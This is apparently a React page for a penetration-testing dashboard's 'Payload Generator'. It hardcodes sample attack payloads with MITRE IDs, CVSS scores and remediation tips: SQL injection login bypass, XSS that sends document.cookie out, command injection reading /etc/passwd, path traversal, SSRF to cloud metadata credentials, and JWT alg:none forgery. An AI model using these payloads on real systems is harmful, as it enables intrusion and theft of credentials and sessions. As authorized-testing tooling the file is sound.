'use client'

import { useState } from 'react'

interface GeneratedPayload {
  id: string
  vulnType: string
  payload: string
  mitreId: string
  cvssScore: number
  remediation: string
  generatedAt: string
}

const VULN_TYPES = [
  'sql_injection',
  'xss',
  'command_injection',
  'path_traversal',
  'ssrf',
  'auth_bypass',
]

function generatePayload(vulnType: string, target: string): GeneratedPayload {
  const payloads: Record<string, { code: string; mitre: string; cvss: number; remediation: string }> = {
    sql_injection: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: eng_20260314_001

-- Blind SQL Injection on login form
POST /api/v1/login HTTP/1.1
Content-Type: application/json

{
  "email": "admin'--",
  "password": "anything"
}

-- Alternative: Time-based blind SQLi
{
  "email": "admin' OR SLEEP(5)--",
  "password": "x"
}`,
      mitre: 'T1190',
      cvss: 9.2,
      remediation: 'Use parameterized queries/prepared statements. Implement input validation and WAF rules.',
    },
    xss: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: eng_20260314_001

<!-- Reflected XSS payload -->
<script>
  fetch('/api/exfil', {
    method: 'POST',
    body: JSON.stringify({ cookies: document.cookie })
  })
</script>

<!-- Alternative: Event-based -->
<img src=x onerror="fetch('/api/exfil?data=' + document.cookie)">`,
      mitre: 'T1059',
      cvss: 7.1,
      remediation: 'Sanitize all user inputs. Use HTML entity encoding. Implement CSP headers.',
    },
    command_injection: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: eng_20260314_001

# Via webshell parameter
GET /api/execute?cmd=id;whoami;uname%20-a HTTP/1.1

# Via POST body
POST /api/process HTTP/1.1
Content-Type: application/json

{
  "filename": "test.txt; cat /etc/passwd > /tmp/exfil.txt"
}`,
      mitre: 'T1059',
      cvss: 8.8,
      remediation: 'Avoid shell execution. Use language APIs instead. Input whitelist validation.',
    },
    path_traversal: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: eng_20260314_001

# Directory traversal
GET /api/file?path=../../../etc/passwd HTTP/1.1

# Encoded traversal
GET /api/download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1

# Null byte bypass
GET /api/read?file=../../../etc/passwd%00.jpg HTTP/1.1`,
      mitre: 'T1083',
      cvss: 7.5,
      remediation: 'Implement path canonicalization. Whitelist allowed directories. Validate absolute paths.',
    },
    ssrf: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: eng_20260314_001

# SSRF to internal endpoint
POST /api/proxy HTTP/1.1
Content-Type: application/json

{
  "url": "http://internal-admin:8000/secret-api"
}

# Accessing cloud metadata
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}`,
      mitre: 'T1090',
      cvss: 8.6,
      remediation: 'Implement URL whitelist. Disable access to internal IPs/cloud metadata. Use egress filtering.',
    },
    auth_bypass: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: eng_20260314_001

# JWT manipulation — signature not verified
{
  "alg": "none",
  "typ": "JWT"
}
.
{
  "sub": "admin",
  "role": "administrator",
  "exp": 9999999999
}
.

# Alternative: header manipulation
GET /api/admin HTTP/1.1
X-Admin-User: true
X-Original-User: admin`,
      mitre: 'T1078',
      cvss: 9.1,
      remediation: 'Always verify JWT signatures. Remove debug modes. Validate user roles server-side.',
    },
  }

  const config = payloads[vulnType] || payloads.sql_injection
  return {
    id: `payload_${Date.now()}`,
    vulnType,
    payload: config.code,
    mitreId: config.mitre,
    cvssScore: config.cvss,
    remediation: config.remediation,
    generatedAt: new Date().toISOString(),
  }
}

export default function PayloadsPage() {
  const [vulnType, setVulnType] = useState('sql_injection')
  const [targetComponent, setTargetComponent] = useState('')
  const [generatedPayloads, setGeneratedPayloads] = useState<GeneratedPayload[]>([])

  function handleGenerate() {
    if (!targetComponent.trim()) return
    const newPayload = generatePayload(vulnType, targetComponent)
    setGeneratedPayloads([newPayload, ...generatedPayloads])
  }

  return (
    <div style={{ minHeight: '100vh', background: 'var(--color-bg-surface)' }}>
      {/* Header */}
      <div style={{
        padding: '20px 24px',
        borderBottom: '1px solid var(--color-border)',
        background: 'var(--color-bg-surface)',
        position: 'sticky',
        top: 0,
        zIndex: 10,
      }}>
        <div className="mono" style={{ fontSize: 10, color: 'var(--color-hemis)', letterSpacing: '0.15em', marginBottom: 4, textTransform: 'uppercase' }}>
          [ HEMIS PAYLOAD GENERATOR ]
        </div>
        <h1 className="display" style={{ fontSize: 20, fontWeight: 700, color: 'var(--color-text-primary)', margin: 0 }}>
          Payload Generator
        </h1>
        <p style={{ fontSize: 12, color: 'var(--color-text-dim)', margin: '6px 0 0' }}>
          Educational attack payloads for authorized testing only
        </p>
      </div>

      {/* Warning Banner */}
      <div style={{
        padding: '12px 24px',
        background: 'var(--color-hemis)15',
        borderBottom: '2px solid var(--color-hemis)',
        display: 'flex',
        gap: 12,
        alignItems: 'center',
      }}>
        <span style={{ fontSize: 16, color: 'var(--color-hemis)', lineHeight: 1, flexShrink: 0 }}>⚠</span>
        <p style={{ fontSize: 11, color: 'var(--color-hemis)', margin: 0, lineHeight: 1.5 }}>
          <strong>AUTHORIZED TESTING ONLY.</strong> These payloads are for educational purposes and authorized penetration testing. Unauthorized use is illegal. By proceeding, you confirm you have written authorization for testing target systems.
        </p>
      </div>

      <div style={{ display: 'flex', minHeight: 'calc(100vh - 200px)' }}>
        {/* Left — Form */}
        <div style={{
          width: 320,
          flexShrink: 0,
          borderRight: '1px solid var(--color-border)',
          padding: '20px 18px',
          overflow: 'auto',
          background: 'var(--color-bg-surface)',
        }}>
          <div className="mono" style={{ fontSize: 9, letterSpacing: '0.15em', color: 'var(--color-hemis)', textTransform: 'uppercase', marginBottom: 12 }}>
            PAYLOAD CONFIGURATION
          </div>

          <div style={{ marginBottom: 16 }}>
            <label className="mono" style={{ fontSize: 9, color: 'var(--color-text-secondary)', display: 'block', marginBottom: 6, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
              Vulnerability Type
            </label>
            <select
              value={vulnType}
              onChange={e => setVulnType(e.target.value)}
              style={{
                width: '100%',
                padding: '8px 10px',
                background: 'var(--color-bg-elevated)',
                border: '1px solid var(--color-border)',
                color: 'var(--color-text-primary)',
                fontFamily: 'var(--font-mono)',
                fontSize: 11,
                boxSizing: 'border-box',
              }}
            >
              {VULN_TYPES.map(vt => (
                <option key={vt} value={vt}>
                  {vt.replace(/_/g, ' ').toUpperCase()}
                </option>
              ))}
            </select>
          </div>

          <div style={{ marginBottom: 16 }}>
            <label className="mono" style={{ fontSize: 9, color: 'var(--color-text-secondary)', display: 'block', marginBottom: 6, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
              Target Component
            </label>
            <input
              type="text"
              value={targetComponent}
              onChange={e => setTargetComponent(e.target.value)}
              placeholder="e.g., /api/login"
              style={{
                width: '100%',
                padding: '8px 10px',
                background: 'var(--color-bg-elevated)',
                border: '1px solid var(--color-border)',
                color: 'var(--color-text-primary)',
                fontFamily: 'var(--font-mono)',
                fontSize: 11,
                boxSizing: 'border-box',
              }}
            />
          </div>

          <button
            onClick={handleGenerate}
            disabled={!targetComponent.trim()}
            style={{
              width: '100%',
              padding: '10px',
              background: !targetComponent.trim() ? 'var(--color-bg-elevated)' : 'var(--color-hemis)',
              color: !targetComponent.trim() ? 'var(--color-text-dim)' : '#ffffff',
              border: 'none',
              fontFamily: 'var(--font-mono)',
              fontSize: 10,
              fontWeight: 600,
              letterSpacing: '0.1em',
              textTransform: 'uppercase',
              cursor: !targetComponent.trim() ? 'not-allowed' : 'pointer',
              transition: 'all 0.12s',
            }}
          >
            ⚡ GENERATE PAYLOAD
          </button>
        </div>

        {/* Right — Generated */}
        <div style={{ flex: 1, padding: '20px 24px', overflow: 'auto' }}>
          {generatedPayloads.length === 0 ? (
            <div style={{ textAlign: 'center', paddingTop: 60 }}>
              <div style={{ fontSize: 28, color: 'var(--color-text-dim)', marginBottom: 10 }}>⚡</div>
              <div className="display" style={{ fontSize: 14, color: 'var(--color-text-secondary)', marginBottom: 4 }}>
                No payloads generated yet
              </div>
              <p style={{ fontSize: 11, color: 'var(--color-text-dim)' }}>
                Select a vulnerability type and target component, then click "GENERATE PAYLOAD"
              </p>
            </div>
          ) : (
            <div>
              {generatedPayloads.map((payload, idx) => (
                <div key={payload.id} style={{
                  marginBottom: 20,
                  background: 'var(--color-bg-elevated)',
                  border: '1px solid var(--color-border)',
                  borderRadius: 0,
                }}>
                  {/* Header */}
                  <div style={{
                    padding: '12px 14px',
                    background: 'var(--color-hemis)10',
                    borderBottom: '1px solid var(--color-border)',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                  }}>
                    <div>
                      <div className="mono" style={{ fontSize: 9, color: 'var(--color-hemis)', letterSpacing: '0.08em', textTransform: 'uppercase', marginBottom: 2 }}>
                        {payload.vulnType.replace(/_/g, ' ')}
                      </div>
                      <div className="mono" style={{ fontSize: 8, color: 'var(--color-text-dim)', letterSpacing: '0.06em' }}>
                        {payload.mitreId} • CVSS {payload.cvssScore}
                      </div>
                    </div>
                    <div className="mono" style={{ fontSize: 9, color: 'var(--color-text-dim)', letterSpacing: '0.08em' }}>
                      {new Date(payload.generatedAt).toLocaleTimeString()}
                    </div>
                  </div>

                  {/* Payload Code */}
                  <div style={{ padding: '14px' }}>
                    <div className="mono" style={{ fontSize: 8, color: 'var(--color-text-dim)', letterSpacing: '0.08em', textTransform: 'uppercase', marginBottom: 8 }}>
                      PAYLOAD
                    </div>
                    <pre style={{
                      background: 'var(--color-bg-surface)',
                      border: '1px solid var(--color-border)',
                      padding: 10,
                      borderRadius: 0,
                      overflow: 'auto',
                      fontSize: 10,
                      lineHeight: 1.6,
                      color: 'var(--color-text-secondary)',
                      fontFamily: 'var(--font-mono)',
                      margin: 0,
                    }}>
                      {payload.payload}
                    </pre>
                  </div>

                  {/* Remediation */}
                  <div style={{ padding: '14px', borderTop: '1px solid var(--color-border)' }}>
                    <div className="mono" style={{ fontSize: 8, color: 'var(--color-text-dim)', letterSpacing: '0.08em', textTransform: 'uppercase', marginBottom: 6 }}>
                      REMEDIATION
                    </div>
                    <p style={{ fontSize: 10, color: 'var(--color-text-secondary)', margin: 0, lineHeight: 1.5 }}>
                      {payload.remediation}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
